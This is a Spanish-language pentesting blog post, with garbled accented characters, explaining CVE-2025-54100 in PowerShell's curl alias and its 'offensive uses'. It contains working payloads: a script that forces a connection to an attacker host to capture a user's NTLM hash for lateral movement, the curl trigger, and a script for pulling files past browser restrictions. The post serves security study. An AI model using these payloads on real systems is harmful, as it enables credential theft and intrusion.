---
title: PoC usos ofensivos del CVE-2025-54100
description: Prueba de concepto y explicaci√≥n del RCE descubierto en Powershell mediante el CVE-2025-54100
date: 2025-12-12
categories: [CVE]
tags: [rce, bypass, evasion, pentesting, opsec, local]     # Los tags deben estar siempre en min√∫sculas.
image:
  path: /assets/img/CVE-2025-54100/0.png

---
## 1. ¬øEn que consiste el CVE-2025-54100?
Este martes han salido parches de seguridad de Microsoft y no ha dejado un Diciembre tranquilo para nadie. El parche entre diferentes vulnerabilidades que parchea defiende nuestros activos del [**CVE-2025-54100**](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-54100) que ha sido puntuado con un CVSS 7.8 y que permite la ejecuci√≥n remota de c√≥digo en mediante powershell. Existen particularidades sobre como esto se da que afectan, no solo a lo tremendamente f√°cil que es de usarlo, sino que impacta al OPSEC y facilita la ejecuci√≥n remota de c√≥digo en entornos en los cuales puedan existir restricciones en el uso de PowerShell. La vulnerabilidad ha sido parcheada mediante el [**KB5074596**](https://support.microsoft.com/es-es/topic/powershell-5-1-impedir-la-ejecuci%C3%B3n-de-scripts-del-contenido-web-7cb95559-655e-43fd-a8bd-ceef2406b705) . <br>

El problema se explica y documenta bien en este post sobre el [**CVE-2025-54100**](https://github.com/osman1337-security/CVE-2025-54100?tab=readme-ov-file) aunque tiene un error en el propio texto sobre el CVE que tiene asignado. El CVE es bastante sencillo, cuando ejecutas Curl en powershell est√°s realizando realmente un Invoke-WebRequest que se supone que tiene el par√°metro UseBasicPartisng el cual no evalua el c√≥digo Javascript. Si no se proporciona el par√°metro de manera directa la petici√≥n Curl lanzar√° con Invoke-WebRequest un Internet Explorer por detr√°s el cual tratar√° de ejecutarlo. El ciclo de la ejecuci√≥n ser√≠a algo similar a lo mostrado en el siguiente esquema. 
![Desktop View](/assets/img/CVE-2025-54100/1.png) 
El motivo como define la propia Microsoft es la Neutralizaci√≥n inadecuada de un elemento especial en un comando, lo cual genera una inyecci√≥n de un comando como explica [**CWE-77**](https://cwe.mitre.org/data/definitions/77.html) . <br>

Vamos a hacer una PoC sencilla para demostrar el uso de esta vulnerabilidad. 
Lo primero que voy a hacer es subir mi payload a mi m√°quina kali con un peque√±o servidor en python. 
![Desktop View](/assets/img/CVE-2025-54100/2.png) 

Simplemente realizamos el curl sobre el payload et voila! Tenemos ejecuci√≥n en la m√°quina.
![Desktop View](/assets/img/CVE-2025-54100/3.png)

## 2. Activos vulnerables y contexto necesario
Para poder enumerar activos que sean vulnerables simplemente tienes que tener en cuenta la versi√≥n de Powershell para poder aprovecharte de ello.

```text
PS C:\Users\c0nfig17> $PSVersionTable

Name                           Value
----                           -----
PSVersion                      5.1.19041.3803
PSEdition                      Desktop
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
BuildVersion                   10.0.19041.3803
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1
```

Tendr√°s que ser capaz de ejecutar Curl mediante Powershell, que suele estar habilitado. 


## 3. Usos ofensivos

### 3.1 Mejora del OPSEC en ejecuciones
Bueno lo primero es evidente, pero de cara a mejorar acciones ofensivas vas a poder usar curl para ejecutar Invoke-WebRequest y abrir internet explorer, por lo que abusar de este CVE te va a permitir ejecutar acciones que quiz√°s ser√≠an m√°s llamativas 

### 3.2 Obtenci√≥n de credenciales via spoofing
Es una manera sencilla y muy funcional de weaponizar esta vulnerabilidad de cara a extraer credenciales sin tener que alojar nada malicioso en la m√°quina. En este caso lo que haremos es alojar un script sencillo en nuestra m√°quina kali. Este script basicamente lo que hace es abusar de esta vulnerabilidad para tratar de conectarnos mediante un XSS a una m√°quina Kali. 
El dise√±o del ataque es el siguiente:
![Desktop View](/assets/img/CVE-2025-54100/4.png)

Alojaremos el siguiente script
```text
<script>new Image().src = "\\\\IPATACANTE\\pwn";</script>
```

Simplemente ejecutaremos una llamada con curl a la m√°quina

```text
curl 192.168.64.155:81/script.js
```
y capturaremos el hash del usuario comprometido sin necesidad de saber la contrase√±a. Ten en cuenta que si realizasemos la misma llamada desde el navegador requeririamos el usuario yc ontrase√±a

![Desktop View](/assets/img/CVE-2025-54100/5.png)

A partir de aqu√≠ el movimiento lateral es tan f√°cil como sea la credencial del usuario. F√°cil.

![Desktop View](/assets/img/CVE-2025-54100/6.jpg){: width="400" }


### 3.3 Descarga de informaci√≥n
Puede ser algo obvio pero puedes utilizar esta vulnerabilidad para descargar informaci√≥n usando Internet Explorer, el cual puede estar capado en algunos entornos. Usar un script que tiene texto te dar√° acceso al mismo y te puede ayudar a pasar un payload por un navegador que no est√© bajo control en un momento concreto. 
```text
<script>open("http://192.168.64.155:85/fichero.txt")</script>
```
Si quieres descargar el fichero puedes usar un formato que el interprete de internet explorer no sepa leer para as√≠ descargarlo, un .zip o un .exe pueden ser de ayuda pero algo ruidosos. 


---
## Apoya el contenido de ciberseguridad en castellano

Si esta publicaci√≥n te ha sido √∫til y quieres apoyar mi trabajo para que contin√∫e creando m√°s contenido, aqu√≠ te dejo algunas formas de apoyar:

1. **Compartir el contenido**  üì≤
   Si crees que esta gu√≠a puede ser √∫til para otras personas, compartirla en tus redes sociales es una gran ayuda. 

2. **Donar en Ko-fi**  üíñ
   Puedes hacer una donaci√≥n r√°pida a trav√©s de Ko-fi para ayudarme a seguir publicando gu√≠as y tutoriales. ¬°Cada aportaci√≥n cuenta y es muy apreciada! 

   <script type='text/javascript' src='https://storage.ko-fi.com/cdn/widget/Widget_2.js'></script><script type='text/javascript'>kofiwidget2.init('Apoya este contenido!', '#455d85', 'A0A41BO608');kofiwidget2.draw();</script> 
   
3. **Usa mi enlace de afiliado de NordVPN y NordPass para mejorar tu seguridad y apoyar la creaci√≥n de contenido**  üõ°Ô∏è
   Puedes suscribirte a [**NordVPN**](https://go.nordvpn.net/aff_c?offer_id=15&aff_id=132246&url_id=902) con un 75% de descuento y 3 meses gratis o a [**NordPass**](https://nordpass.com/special/?utm_medium=affiliate&utm_term&utm_content&utm_campaign=off488&utm_source=aff132246&aff_free) con un 53% de descuento y 3 meses gratis y mejorar tu seguridad a la vez que apoyas el contenido de ciberseguridad en espa√±ol. <br>

---

¬°Gracias por tu apoyo! üôè
![Desktop View](/assets/img/banner.png) <br>

